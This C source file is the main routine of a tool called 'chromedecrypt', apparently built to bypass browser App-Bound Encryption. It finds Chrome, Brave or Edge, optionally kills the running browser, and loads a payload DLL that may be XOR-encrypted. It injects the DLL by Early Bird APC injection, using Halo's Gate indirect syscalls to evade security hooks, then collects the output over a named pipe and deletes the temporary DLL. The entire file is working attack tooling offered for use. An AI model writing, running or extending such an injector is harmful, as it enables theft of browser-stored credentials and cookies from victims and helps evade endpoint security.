#include "injector.h"
#include "../syscalls/syscalls.h"
#include "../crypto/xor_crypt.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Embedded encrypted payload — filled at build time by embed tool
// For now, load from file
extern BOOL sc_init_global(void);

static void print_banner(void) {
    printf("=== chromedecrypt ===\n");
    printf("ABE bypass via COM IElevator\n");
    printf("Halo's Gate + Indirect Syscalls\n");
    printf("Early Bird APC Injection\n\n");
}

static void print_usage(const char* argv0) {
    printf("Usage: %s [options]\n", argv0);
    printf("  -b chrome|brave|edge  Target browser (default: chrome)\n");
    printf("  -o <dir>            Output directory (default: .\\output)\n");
    printf("  -p <payload.dll>    Payload DLL path\n");
    printf("  -k                  Kill existing browser processes first\n");
    printf("  -h                  Show this help\n");
}

int main(int argc, char* argv[]) {
    print_banner();

    INJECT_CTX ctx = {0};
    ctx.browser = BROWSER_CHROME;
    strcpy(ctx.output_dir, ".\\output");
    char payload_path[MAX_PATH] = "payload.dll";
    BOOL do_kill = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) {
            i++;
            if (_stricmp(argv[i], "brave") == 0)
                ctx.browser = BROWSER_BRAVE;
            else if (_stricmp(argv[i], "edge") == 0)
                ctx.browser = BROWSER_EDGE;
            else
                ctx.browser = BROWSER_CHROME;
        } else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
            strncpy(ctx.output_dir, argv[++i], MAX_PATH - 1);
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            strncpy(payload_path, argv[++i], MAX_PATH - 1);
        } else if (strcmp(argv[i], "-k") == 0) {
            do_kill = TRUE;
        } else {
            print_usage(argv[0]);
            return 1;
        }
    }

    // Initialize syscall engine
    printf("[*] Initializing Halo's Gate syscall engine...\n");
    if (!sc_init_global()) {
        printf("[-] Failed to initialize syscalls\n");
        return 1;
    }
    printf("[+] Syscall table resolved\n");

    // Browser display names
    static const char* browser_names[] = { "Chrome", "Brave", "Edge" };
    const char* bname = browser_names[ctx.browser];

    // Find browser path
    if (!find_browser_path(ctx.browser, ctx.chrome_path, MAX_PATH)) {
        printf("[-] Could not find %s executable\n", bname);
        return 1;
    }
    printf("[+] Browser: %s\n", ctx.chrome_path);

    // Kill browser if requested
    if (do_kill) {
        static const char* exe_names[] = { "chrome.exe", "brave.exe", "msedge.exe" };
        printf("[*] Killing existing %s processes...\n", exe_names[ctx.browser]);
        kill_browser(exe_names[ctx.browser]);
    }

    // Load payload DLL
    printf("[*] Loading payload from %s\n", payload_path);
    HANDLE hFile = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open payload: %lu\n", GetLastError());
        return 1;
    }

    DWORD payload_size = GetFileSize(hFile, NULL);
    PBYTE payload_data = (PBYTE)malloc(payload_size);
    DWORD read_bytes;
    ReadFile(hFile, payload_data, payload_size, &read_bytes, NULL);
    CloseHandle(hFile);

    // If payload is XOR-encrypted, decrypt it
    // Check for magic bytes — encrypted payloads start with "XORPLD" marker
    if (payload_size > 6 + XOR_KEY_LEN &&
        memcmp(payload_data, "XORPLD", 6) == 0) {
        printf("[*] Decrypting XOR-encrypted payload...\n");
        BYTE key[XOR_KEY_LEN];
        memcpy(key, payload_data + 6, XOR_KEY_LEN);
        PBYTE enc_data = payload_data + 6 + XOR_KEY_LEN;
        DWORD enc_size = payload_size - 6 - XOR_KEY_LEN;
        xor_rolling(enc_data, enc_size, key);
        SecureZeroMemory(key, XOR_KEY_LEN);

        // Shift decrypted data to start of buffer
        memmove(payload_data, enc_data, enc_size);
        payload_size = enc_size;
    }

    // Verify PE signature
    if (payload_size < sizeof(IMAGE_DOS_HEADER) ||
        ((PIMAGE_DOS_HEADER)payload_data)->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid PE payload\n");
        free(payload_data);
        return 1;
    }

    printf("[+] Payload loaded (%lu bytes)\n", payload_size);

    // Inject via Early Bird APC
    printf("[*] Injecting into %s...\n", bname);

    if (!inject_payload(&ctx, payload_data, payload_size)) {
        printf("[-] Injection failed\n");
        free(payload_data);
        return 1;
    }

    SecureZeroMemory(payload_data, payload_size);
    free(payload_data);

    // Run pipe server and wait for results
    if (!run_pipe_server(&ctx)) {
        printf("[-] Pipe communication failed\n");
        return 1;
    }

    // Cleanup
    Sc_NtClose(ctx.hThread);
    Sc_NtClose(ctx.hProcess);

    // Delete temp DLL
    if (ctx.dll_temp_path[0])
        DeleteFileA(ctx.dll_temp_path);

    printf("[+] Output written to %s\n", ctx.output_dir);
    printf("[+] Done\n");
    return 0;
}
